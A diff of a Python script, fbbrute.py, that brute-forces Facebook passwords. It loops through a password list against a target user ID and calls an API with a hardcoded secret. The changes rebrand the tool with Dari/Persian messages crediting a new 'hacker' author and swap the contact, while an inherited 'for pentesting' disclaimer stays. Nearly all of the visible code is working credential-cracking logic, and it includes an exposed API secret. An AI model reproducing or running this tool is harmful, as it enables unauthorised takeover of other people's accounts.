@@ -1,4 +1,4 @@
-## fbbrute.py - Facebook Brute Force
+## fbbrute.py - ساخت ادریس افشار هکر افغانستان
 # -*- coding: utf-8 -*-
 ##
 import os
@@ -10,10 +10,10 @@ API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"
 
 __banner__ = """
        +=======================================+
-       |..........Facebook Cracker v 1.........|
+       |.....فیسبوک هکر ساخته شده توسط ادریس افشار....|
        +---------------------------------------+
        |#Author: DedSecTL <dtlily>             |
-       |#Contact: Telegram @dtlily             |
+       |#Contact: Telegram @kabultech          |
        |#Date: Fri Feb 8 10:15:49 2019         |
        |#This tool is made for pentesting.     |
        |#Changing the description of this tool |
@@ -22,7 +22,7 @@ __banner__ = """
        |#I take no responsibilities for the    |
        |  use of this program !                |
        +=======================================+
-       |..........Facebook Cracker v 1.........|
+       |................ نسخه v 1...............|
        +---------------------------------------+
 """
 
@@ -32,9 +32,9 @@ try:
 	passlist = raw_input("[*] Set PATH to passlist: ")
 	if os.path.exists(passlist) != False:
 		print(__banner__)
-		print(" [+] Account to crack : {}".format(userid))
+		print(" [+] حساب در حال هک : {}".format(userid))
 		print(" [+] Loaded : {}".format(len(open(passlist,"r").read().split("\n"))))
-		print(" [+] Cracking, please wait ...")
+		print(" [+] در حال هک صبر کنید ...")
 		for passwd in open(passlist,'r').readlines():
 			sys.stdout.write(u"\u001b[1000D[*] Trying {}".format(passwd.strip()))
 			sys.stdout.flush()
@@ -45,10 +45,10 @@ try:
 			if "error" in response:
 				pass
 			else:
-				print("\n\n[+] Password found .. !!")
-				print("\n[+] Password : {}".format(passwd.strip()))
+				print("\n\n[+] تبریک پسورد پیدا شد .. !!")
+				print("\n[+] پسورد : {}".format(passwd.strip()))
 				break
-		print("\n\n[!] Done .. !!")
+		print("\n\n[!] موفق شدید .. !!")
 	else:
 		print("fbbrute: error: No such file or directory")
 except KeyboardInterrupt:
